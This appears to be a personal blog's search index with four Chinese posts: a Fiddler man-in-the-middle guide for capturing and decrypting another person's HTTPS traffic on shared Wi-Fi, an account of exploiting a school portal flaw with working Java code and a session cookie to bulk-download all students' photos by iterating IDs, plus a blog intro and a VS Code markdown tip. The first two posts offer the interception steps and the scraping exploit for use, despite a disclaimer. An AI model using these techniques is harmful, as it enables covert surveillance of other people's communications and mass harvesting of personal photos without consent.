<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一个简单的监听设备上网教程(fiddler抓包)</title>
      <link href="/2019/08/06/get-talk/"/>
      <url>/2019/08/06/get-talk/</url>
      
        <content type="html"><![CDATA[<h1 id="一个简单的监听设备上网教程"><a href="#一个简单的监听设备上网教程" class="headerlink" title="一个简单的监听设备上网教程"></a>一个简单的监听设备上网教程</h1><blockquote><p>&emsp;&emsp;由于网络诈骗盗号层出不穷，谣言止于智者，所以给大家开始普及网络攻防安全。先从最基础的网络说起，这是第一版教程，之后回陆续介绍一下其他的方法。</p></blockquote><br><h2 id="责任申明"><a href="#责任申明" class="headerlink" title="责任申明"></a>责任申明</h2><p>&emsp;&emsp;本篇博客原创仅供学习交流使用，如用作其他用途所承受的法律责任一概与作者无关。</p><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p> &emsp;&emsp;由于是最初教程，首先给大家大致普及一下互联网的通讯，从广泛的http通讯说起吧。</p><blockquote><p>&emsp;&emsp;你通过wifi连接电脑上网浏览网址，通过一个域名搜索一个网站，首先是电脑查看host里面是否存在之前解析的ip(如果你之前访问过该网站的话),如果不存在，则dns解析域名获取服务端的ip地址，之后把访问请求通过层次关系后传给路由(网关)，路由根据ip地址查看自身的路由表（静态路由表和动态路由表），通过点对点法则（和交换机的广播不同，广播是一对多）将请求发送给该路由已知的下一个路由（局部最优路径），之后下一个路由也根据路由表转发该请求，直到传到目的ip地址。服务端接到请求后，根据你发送的请求将固定的页面按同样的方法发送给你。</p></blockquote><h2 id="开始教程"><a href="#开始教程" class="headerlink" title="开始教程"></a>开始教程</h2><p> 前提条件：<br><br>&emsp;&emsp;你和你要监听对象是连在同一个网络中的(比如: wifi网络).<br>此处笔者模拟的是在手机连在电脑的一个热点下电脑端监听聊天.(注:如果是统一wifi下，你可以登录家庭路由器的网址在路由设置里面更改代理(部分路由器可能没有端口镜像或端口监控功能),代理所填写的ip是你抓取别人上网数据的设备的ip，如果没有路由器代理功能，手机上wifi模式下长按连接的wifi选择高级选项，在里面填写代理和监听端口.<br>  <br></p><h2 id="第一步-下载fiddler"><a href="#第一步-下载fiddler" class="headerlink" title="第一步 下载fiddler"></a>第一步 下载fiddler</h2><p>  &emsp;&emsp;在百度上搜索fiddler下载，<a href="https://www.baidu.com/link?url=PNiuANjLE32GLkoC_yZd4JC2ugEFhvLsD_GUQ_66oYV5IfotNo3uR5sb6eiSrvcP&wd=&eqid=d4505bdf00123fd3000000065d4bb5f4" target="_blank" rel="noopener">fiddler官网</a> <br><br>  &emsp;&emsp;下载完成之后打开<br>  &emsp;&emsp;界面是这样的：<br>  <img src="/2019/08/06/get-talk/1.png" alt="fiddler界面截图"></p><h2 id="第二步-设置抓包选项"><a href="#第二步-设置抓包选项" class="headerlink" title="第二步 设置抓包选项"></a>第二步 设置抓包选项</h2><p>   &emsp;&emsp;在主界面左上角tools选择options界面 </p><p>   <img src="/2019/08/06/get-talk/2.png" alt="options界面"><br><br><br>   &emsp;&emsp;按照如图更改：<br>   <br><br>    <img src="/2019/08/06/get-talk/3.png" alt="更改HTTPS设置"><br>    <br><br>&emsp;&emsp;解释：<br>    &emsp;&emsp;因为fiddler默认只会抓取http协议的请求数据，所以我们选择Capture HTTPS CONNECTs(捕获HTTPS连接),意思是可以捕获https的请求数据会在主界面显示<br><br><br>    <img src="/2019/08/06/get-talk/4.png" alt="更改Connections设置"><br>    <br><br>     &emsp;&emsp;Decrypt HTTPS traffic(解密HTTPS通信),https是加密传输，我们fiddler只有使用中间人攻击才能破译对方上网的数据。</p><pre><code>from all processes:来自所有进程 from browsers only:仅从浏览器from non-browsers only:仅从非浏览器from remote clients only:仅从远程客户端</code></pre><p>  &emsp;&emsp;如果我们想抓取对方的上网信息，不抓取本地我们自己的上网信息，就可以选择from remote clients only，这样就不会抓到我们自己的数据包了。<br>  &emsp;&emsp;不建议勾选 check for certificate revocation(检查证书是否过期)</p><p>  &emsp;&emsp;非必选：然后选择右方的Actions，选择把证书下载到桌面上。之后需要用。<br>   <br><br>  <img src="/2019/08/06/get-talk/5.png" alt="监听端口设置"><br>  &emsp;&emsp;选择监听端口为8888，选中allow remote computers to connect.</p><h2 id="第三步-手机端配置"><a href="#第三步-手机端配置" class="headerlink" title="第三步 手机端配置"></a>第三步 手机端配置</h2><p> &emsp;&emsp;长按所选wlan<br>   <br></p><p><img src="/2019/08/06/get-talk/6.png" alt="连接wlan"></p><p><img src="/2019/08/06/get-talk/7.png" alt="修改网络"><br> <br><br>&emsp;&emsp;选择修改网络，选中高级设置<br>&emsp;&emsp;代理主机地址之后填写，先填写我们最开始设置的端口号8888<br> <br><br><img src="/2019/08/06/get-talk/8.png" alt="设置代理端口"><br><br><br>&emsp;&emsp;同时，电脑端win+R弹出运行框，输入cmd确定后，在dos界面输入ipconfig，找到如下：<br><br><br> <img src="/2019/08/06/get-talk/9.png" alt="查找代理主机ip"></p><p>&emsp;&emsp;这里的ipv4地址就是手机端要输入的代理主机的地址(内网地址)<br>&emsp;&emsp;之后手机连接电脑：</p><p><img src="/2019/08/06/get-talk/10.png" alt="成功连接"></p><h2 id="第四步-安装CA证书"><a href="#第四步-安装CA证书" class="headerlink" title="第四步 安装CA证书"></a>第四步 安装CA证书</h2><p>&emsp;&emsp;手机打开浏览器，搜索格式为 <strong>你刚刚在手机端填写的代理主机地址</strong>:8888,出现如下界面就证明你离成功就差一步了<br> <img src="/2019/08/06/get-talk/11.png" alt="手机界面"><br> &emsp;&emsp;点击下载FiddlerRoot certificate ，然后安装证书即可。（某些手机可能无法直接安装，需要在设置里面找到用户信任凭证或者证书下安装才可）</p><p> &emsp;&emsp;现在我们再打开fiddler，手机端浏览<a href="github.com">github官网</a>，fiddler抓包效果：</p><p> <img src="/2019/08/06/get-talk/12.png" alt="fiddler抓包"></p><h2 id="最后一点"><a href="#最后一点" class="headerlink" title="最后一点"></a>最后一点</h2>  <p>&emsp;&emsp;关于fiddler抓包qq，微信聊天记录，fiddler只能抓取http/https协议的通信，如果上面没有显示则证明qq微信用的其他通信协议，那么就要去学习其他的抓包软件，如强大且复杂的Wireshark根据自己的理解慎重选择学习。</p>]]></content>
      
      
      <categories>
          
          <category> 探究网络原理 </category>
          
          <category> 抓包 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 抓包 fiddler 网络原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学校教务网的一个安全漏洞</title>
      <link href="/2019/08/05/find-leak/"/>
      <url>/2019/08/05/find-leak/</url>
      
        <content type="html"><![CDATA[<h1 id="发现教务网的一个安全漏洞"><a href="#发现教务网的一个安全漏洞" class="headerlink" title="发现教务网的一个安全漏洞"></a>发现教务网的一个安全漏洞</h1><blockquote><p>&emsp;&emsp;在做一个人脸识别的项目时，需要获取学校教务网上的学生的照片，但是后来我无意中发现学校教务网上的一个安全漏洞，就是在得到自己图片的cookie之后，由于学校的http请求是get请求，并且由于cookie的权限会导致你在持有cookie的情况下可以访问学校任何一个有学号的同学的照片</p></blockquote><br><h2 id="http的get请求和post请求的区别"><a href="#http的get请求和post请求的区别" class="headerlink" title="http的get请求和post请求的区别"></a>http的get请求和post请求的区别</h2><p>&emsp;&emsp;关于这一点,直接把百度的结果粘贴如下:</p><p>&emsp;&emsp;<strong> GET和POST是Http请求中最常用的两种请求方法: </strong></p><blockquote><p>   首先介绍GET与POST的差异:</p><p>   （1）GET请求资源数据，POST向服务器传递需要处理的数据</p><p>  （2）GET传递数据大小不超过2kb，POST没有限制</p><p>  （3）GET请求的参数会在Url上暴露显示，POST请求参数在Requestbody里，所以相对GET来说，POST安全性较高</p><p>  （4）GET 请求的静态资源会被浏览器缓存，POST不会被缓存</p><p>   （5）GET传递的数据类型是文本，POST是文本或者二进制</p><p>   （6）GET请求被回退时是无害的，POST请求被回退是会被重新再执行一次GET和POST的使用场景：  </p><blockquote><p>   （a）在传递一些机密信息时必须要使用POST<br>   （b）只是查询获取数据时可以用GET<br>   （c）POST请求速率会比GET慢，因为GET请求产生一个TCP数据包;POST请求产生两个TCP数据包</p></blockquote></blockquote><hr><br><h2 id="探究过程"><a href="#探究过程" class="headerlink" title="探究过程"></a>探究过程</h2>   <p>&emsp;&emsp;由于get请求的参数会在url暴露显示，我们可以直接更改url上的参数，将学号更改为其他人的学号来获取其他人的照片信息,但是发现这样获取太慢了，就直接写个多线程批量下载照片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;  </span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.net.HttpURLConnection;  </span><br><span class="line">import java.net.URL;  </span><br><span class="line">  </span><br><span class="line"> public class downimage &#123;  </span><br><span class="line">public static void  downLoadFromUrl(String urlStr,String fileName,String </span><br><span class="line">savePath) throws IOException&#123;</span><br><span class="line">        URL url = new URL(urlStr);  </span><br><span class="line">        HttpURLConnection conn = (HttpURLConnection)url.openConnection();  </span><br><span class="line">        conn.setConnectTimeout(3*1000); </span><br><span class="line">        System.setProperty(&quot;http.proxyHost&quot;, &quot;localhost&quot;); </span><br><span class="line">        System.setProperty(&quot;http.proxyPort&quot;, &quot;8888&quot;);         </span><br><span class="line">        conn.setRequestProperty(&quot;User-Agent&quot;, &quot;Mozilla/4.0 (compatible;</span><br><span class="line"> MSIE 5.0; Windows NT; DigExt)&quot;);</span><br><span class="line">            conn.setRequestProperty(&quot;Cookie&quot;,&quot;semester.id=281;</span><br><span class="line"> JSESSIONID=8F14338919CEA1334F7E4B558217782D; </span><br><span class="line">iPlanetDirectoryPro=vYeKkeVYfd97aWCGmR2lSA&quot;);</span><br><span class="line">        InputStream inputStream = conn.getInputStream();  </span><br><span class="line">        byte[] getData = readInputStream(inputStream);    </span><br><span class="line">        File saveDir = new File(savePath);</span><br><span class="line">        if(!saveDir.exists())&#123;</span><br><span class="line">            saveDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        File file = new File(saveDir+File.separator+fileName);    </span><br><span class="line">        FileOutputStream fos = new FileOutputStream(file);     </span><br><span class="line">        fos.write(getData); </span><br><span class="line">        if(fos!=null)&#123;</span><br><span class="line">            fos.close();  </span><br><span class="line">        &#125;</span><br><span class="line">        if(inputStream!=null)&#123;</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;info:&quot;+url+&quot; download success&quot;); </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static  byte[] readInputStream(InputStream inputStream) throws </span><br><span class="line">IOException &#123;  </span><br><span class="line">        byte[] buffer = new byte[1024];  </span><br><span class="line">        int len = 0;  </span><br><span class="line">        ByteArrayOutputStream bos = new ByteArrayOutputStream();  </span><br><span class="line">        while((len = inputStream.read(buffer)) != -1) &#123;  </span><br><span class="line">            bos.write(buffer, 0, len);  </span><br><span class="line">        &#125;  </span><br><span class="line">        bos.close();  </span><br><span class="line">        return bos.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">public static void main(String[] args) throws InterruptedException &#123;</span><br><span class="line">    int z=起始学号;</span><br><span class="line">    int y = 结束学号;</span><br><span class="line">    for (int i=起始学号;i&lt;=v结束学号;i++)&#123;</span><br><span class="line">      String filename=y+&quot;.jpg&quot;;</span><br><span class="line">    String x=&quot;网址&quot;+z;//z是学号，由于是get请求</span><br><span class="line">    new Thread(new Runnable()&#123;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line">public void run() &#123;</span><br><span class="line">// TODO Auto-generated method stub</span><br><span class="line"> try&#123;</span><br><span class="line">     downLoadFromUrl(x,</span><br><span class="line">         filename,&quot;C:/Users/asus/Desktop/pictures&quot;);</span><br><span class="line">            </span><br><span class="line">        &#125;catch (Exception e) &#123;</span><br><span class="line">            // TODO: handle exception</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    &#125;).start();</span><br><span class="line">    Thread.sleep(2000);</span><br><span class="line">    z++;</span><br><span class="line">    y++;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;线程休眠2s,之后直接将图片下载到桌面上的文件夹中，理论上你可以下载所有学生的照片，<del>如果外带一个人脸识别接口判断颜值，就能找到校花了</del> </p><h2 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h2><p>抓取成果:</p><p><img src="/2019/08/05/find-leak/find-leak.png" alt="成果截图"><br>           &nbsp; &nbsp; &nbsp; ps：为保护隐私，给图片打码。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>&emsp;&emsp;源代码中cookie是需要你手动获取的，在浏览器中打开图片前f12打开浏览器开发者模式,找到含有sessionid的cookie手动填上去。如果觉得麻烦，这里提供一个思路：先用账号密码登录官网，然后用document.cookie获取到cookie，然后包装请求头再次发送给服务器，前提是该cookie没有设置httponly。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2> <p>&emsp;&emsp;本篇博客原创仅供学习交流使用，如用作其他用途所承受的法律责任一概与作者无关。</p>]]></content>
      
      
      <categories>
          
          <category> 安全漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 简易爬虫 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>导论</title>
      <link href="/2019/07/30/%E5%AF%BC%E8%AE%BA/"/>
      <url>/2019/07/30/%E5%AF%BC%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="why-blog"><a href="#why-blog" class="headerlink" title="why blog"></a>why blog</h1><blockquote><p>&emsp;&emsp;长久以来一个问题一直困扰着我，为什么有些东西如此昂贵，如此的高科技，却毫无用处，就像我知道的，计算机虽然是台笨机器，却有能力做出难以置信的智能事情，而程序员虽然是一些聪明的人，但却老是做难以置信的傻事情。他们呀，简言之，是对绝配。</p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;— Bill Bryson, 作家, 出自《Notes from a Big Country》</p></blockquote><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>&emsp;&emsp;针对网络上繁杂的基础知识和实验流程做一个自己总结的简略总结，每个人的思维方式和问题角度，对待问题的着重点不同以至于在网络上看待一个过程，知识点，问题的解决方案每个人所得到的东西都不尽一致。希望自己能尽心尽力地去总结我在学习上遇到的各种困难问题，这样对自己后来的复习和解决新的困难时会更加迅速。</p><h2 id="学习困境"><a href="#学习困境" class="headerlink" title="学习困境"></a>学习困境</h2><p>&emsp;&emsp;需要学习的东西太多，完整消化一个知识点又需要很长时间，比如对于http协议的深入了解还需要去了解交换机局域网的通信原理，在学习过程种所遇到的困难很多，网络上有些存在解决方案但是没有讲授出现问题的原因。况且身边的学习氛围不够浓厚，除非意志坚定很难在一段漫长的时间里保持对学习的高度热情，并且身处群体之中，个体很难维持长久的理智。希望自己能在学习的道路上顽强走下去。</p><h2 id="继续深入"><a href="#继续深入" class="headerlink" title="继续深入"></a>继续深入</h2><ul><li>wireshark的使用</li><li>完整探究局域网的底层通讯原理</li><li>学习二维码的原理</li><li>框架架构设计模式的根本区别</li><li>了解数据保护</li><li>深入探究web开发流程客户端服务端数据库的三方通讯</li><li>巩固代码基础（java implements）</li><li>修改校园失物巡回箱子的刷新监听代码</li><li>修改校园失物巡回箱子人脸动态活体扫描机制</li><li>抓取学校官网的照片并进行人脸对比</li><li>了解dns劫持</li><li>写http图解的读后感，梳理其中的web攻击方式（博客）</li><li>熟悉安卓的mvp和mvc设计模式</li><li>了解脚本</li></ul><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>好好学习</p>]]></content>
      
      
      <categories>
          
          <category> 导论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 导论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode的markdown操作</title>
      <link href="/2019/07/30/vscode%E6%96%87%E6%A1%A3/"/>
      <url>/2019/07/30/vscode%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Vscode-Markdown-相关问题"><a href="#Vscode-Markdown-相关问题" class="headerlink" title="Vscode Markdown 相关问题"></a>Vscode Markdown 相关问题</h2><blockquote><p>关于vscode markdown.styles如何使用自定义css文件的解决方案</p></blockquote><h3 id="问题"><a href="#问题" class="headerlink" title="问题:"></a>问题:</h3><p>出现无法加载 “markdown.styles”的显示框</p><h3 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因:"></a>问题原因:</h3><blockquote><p>根据issue说是安全原因取消了绝对路径样式，以至于现在无法使用绝对路径</p><p><a href="https://github.com/Microsoft/vscode/issues/45260" target="_blank" rel="noopener">https://github.com/Microsoft/vscode/issues/45260</a></p></blockquote><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法:  "></a>解决办法: <br> <br></h3><p> &ensp; &ensp;要么使用扩展，要么用当前工作空间的相对路径。就是说你这个css文件相对于当前编辑的文件的位置的路径，如果觉得绕口，就把css文件放在编辑文件的同一个目录下，这样路径直接填css文件名就好了。</p><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程:  "></a>操作过程: <br> <br></h3><p> 第一步在vscode界面的左下角齿轮打开设置，输入markdown</p><p> <img src="/2019/07/30/vscode文档/1.png" alt="第一步"></p><p> 第二步找到Markdown.styles，点击编辑</p><p> <img src="/2019/07/30/vscode文档/2.png" alt="第二步"></p><p> 第三步修改如图， <strong>注意的是你填写的路径如我开头所讲的那样，是你当前编辑文件的相对路径</strong>    </p><p> <img src="/2019/07/30/vscode文档/3.png" alt="第三步"></p><p> 修改完成之后就会看到效果。</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
